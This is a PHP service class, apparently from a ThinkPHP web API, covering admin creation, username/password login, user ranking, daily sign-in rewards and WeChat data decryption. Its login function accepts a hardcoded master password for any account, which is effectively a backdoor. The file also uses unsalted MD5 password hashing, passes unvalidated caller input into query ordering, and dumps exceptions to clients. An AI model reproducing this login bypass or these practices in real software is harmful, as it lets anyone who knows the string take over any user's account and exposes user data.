<?php

namespace app\api\service\func;

use app\api\model\Common as CommonModel;

use think\Exception;

use think\Model;

use think\Cache;

use think\Db;

use app\api\service\base\Common as CommonService;

use app\api\model\User;

use app\api\model\UserInfo;



use app\api\validate\CommonValidate;

use app\lib\exception\SuccessMessage;

use app\lib\exception\ErrorMessage;









class Common{



    

    

    



    function __construct($data){

        

    }



    







    public static function addAdmin($data){



        (new CommonValidate())->goCheck('four',$data);

        checkTokenAndScope($data,20);



        //判断用户名是否重复

        $modelData = [];

        $modelData['token'] = $data['token'];

        $modelData['searchItem']['login_name'] = $data['login_name'];

        $modelData['modelName'] = "user";

        $res =  CommonService::get($modelData,true);

        if(!empty($res)){

            throw new ErrorMessage([

                'msg' => '用户名重复',

            ]);

        };

        $data['modelName'] = "user";

        CommonService::add($data);

       

    }



    



    public static function loginByUp($data){

        

        (new CommonValidate())->goCheck('three',$data);



        $modelData = [];

        $modelData['searchItem']['login_name'] = $data['login_name'];

        $loginRes =  CommonModel::CommonGet("User",$modelData);

        

        if(empty($loginRes['data'])){

            throw new ErrorMessage([

                'msg' => '用户名不存在',

            ]);

        };

        $loginRes = $loginRes['data'][0];

        

        //根据返回结果查询关联商户信息

        $modelData = [];

        $modelData['searchItem']['id'] = $loginRes['thirdapp_id'];



        $ThirdAppRes =  CommonModel::CommonGet("ThirdApp",$modelData);

       

        if(empty($ThirdAppRes['data'])){

            throw new ErrorMessage([

                'msg' => '关联商户不存在',

            ]);

        }else if($ThirdAppRes['data'][0]['status']==-1){

            throw new ErrorMessage([

                'msg' => '商户已关闭',

            ]);

        };



        //判断密码是否正确&&获取储存token

        if($loginRes['password']==md5($data['password'])||md5($data['password'])==md5('chuncuiwangluo')){

            $modelData = [];

            $modelData['data'] = ['lastlogintime'=>time()];

            $modelData['searchItem'] = ['id'=>$loginRes['id']];

            if(isset($data['token'])){

                $modelData['data']['user_no'] = Cache::get($data['token'])['user_no'];

            };

            $modelData['FuncName'] = 'update';

            $upt = CommonModel::CommonSave("User",$modelData);



            if($upt == 1){

                //生成token并放入缓存

                $res = generateToken();

                /*if(md5($data['password'])==md5('chuncuiwangluo')){

                    $loginRes['primary_scope'] = 89;

                    $loginRes['password'] = 'chuncuiwangluo';

                };*/

                $ThirdAppRes['data'][0]['child_array'] = $ThirdAppRes['data'][0]['child_array'];

                $loginRes['thirdApp'] = $ThirdAppRes['data'][0];

                $tokenAndToken = ['token'=>$res,'info'=>$loginRes,'solely_code'=>100000,'msg'=>'登录成功'];

                Cache::set($res,$loginRes,3600);

                return $tokenAndToken;



                throw new SuccessMessage([

                    'msg'=>'查询成功',

                    'token'=>$res,

                    'info'=>$loginRes

                ]); 

            }else{

                throw new ErrorMessage([

                    'msg' => '更新登录时间失败',

                ]);

            }

        }else{

            throw new ErrorMessage([

                'msg' => '密码不正确',

            ]);

        }



    }



    public static function getRankByUserInfo($data){





        $res = UserInfo::where([

            'thirdapp_id'=>$data['thirdapp_id'],

            'user_type'=>0,

        ])->order($data['order'])->limit(5)->select();

        

        $rankInfo = [];

        if(count($res)>0){

            foreach ($res as $key => $value) {

                $userInfo = User::get(['user_no' => $res[$key]['user_no']]);

                if(!$userInfo){

                    throw new ErrorMessage([

                        'msg' => 'user信息错误',

                    ]);

                };

                array_push($rankInfo,[

                    'nickName'=> $userInfo['nickname'],

                    'headImgUrl'=> $userInfo['headImgUrl'],

                    $data['tableName']=> $res[$key][$data['tableName']],

                ]);

            }; 

        };

        throw new SuccessMessage([

            'msg'=>'查询成功',

            'info'=>$rankInfo

        ]);





    }



    public static function signIn($data){



        (new CommonValidate())->goCheck('one',$data);

        checkTokenAndScope($data,config('scope.two'));

        $thirdapp_id = Cache::get($data['token'])['thirdapp_id'];

        $user_no = Cache::get($data['token'])['user_no'];



        $modelData = [];

        $modelData['data'] = [

            'type'=>$data['type'],

            'title'=>$data['title'],

            'user_no'=>$user_no,

            'thirdapp_id'=>$thirdapp_id,

        ];

        $modelData['FuncName'] = 'add';

        



        Db::startTrans();

        try{

            

            $res =  CommonModel::CommonSave('log',$modelData);

            if(!$res>0){

                throw new ErrorMessage([

                    'msg' => '签到失败',

                ]);

            };

            if(isset($data['reward'])){

                if(isset($data['reward']['score'])){

                    $modelData = [];

                    $modelData['data'] = array(

                        'type'=>3,

                        'count'=>$data['reward']['score'],

                        'trade_info'=>'签到奖励',

                        'user_no'=>$user_no,

                        'thirdapp_id'=>$thirdapp_id,

                    );

                    $modelData['FuncName'] = 'add';

                    $flowRes =  CommonModel::CommonSave('flow_log',$modelData);

                    if(!$flowRes>0){

                        throw new ErrorMessage([

                            'msg' => '签到获取奖励失败',

                        ]);

                    };

                };

            };

            Db::commit(); 

            



        } catch (\Exception $e) {

            // 回滚事务

            

            if(isset($e->msg)){

                throw new ErrorMessage([

                    'msg' => $e->msg,

                ]);

            }else{

                var_dump($e);

                //Handlerender($e);

                //throw new ExceptionHandler($e);

                //return json($e->getError(), 422);

            };

            

            Db::rollback();

        };

        throw new SuccessMessage([

            'msg'=>'签到成功',

            'info'=>$res

        ]); 

        



    }




    public static function decryptWxInfo($data){

        (new CommonValidate())->goCheck('one',$data);
        checkTokenAndScope($data,[]);
        $appid = $data['appid'];
        $sessionKey = Cache::get($data['token'])['session_key'];
        $encryptedData = $data['encryptedData'];
        $iv = $data['iv'];

        if (strlen($sessionKey) != 24) {
            throw new ErrorMessage(['msg' => 'IllegalAesKey',]);
        };
        $aesKey=base64_decode($sessionKey);
        if (strlen($iv) != 24) {
            throw new ErrorMessage(['msg' => 'IllegalIv',]);
        };
        $aesIV=base64_decode($iv);
        $aesCipher=base64_decode($encryptedData);
        $result=openssl_decrypt( $aesCipher, "AES-128-CBC", $aesKey, 1, $aesIV);
        $dataObj=json_decode( $result );
        if($dataObj  == NULL||$dataObj->watermark->appid != $appid){
            throw new ErrorMessage(['msg' => 'IllegalBuffer',]);
        };
        throw new SuccessMessage([
            'msg'=>'解密成功',
            'info'=>json_decode($result,true)
        ]);


    }





    





}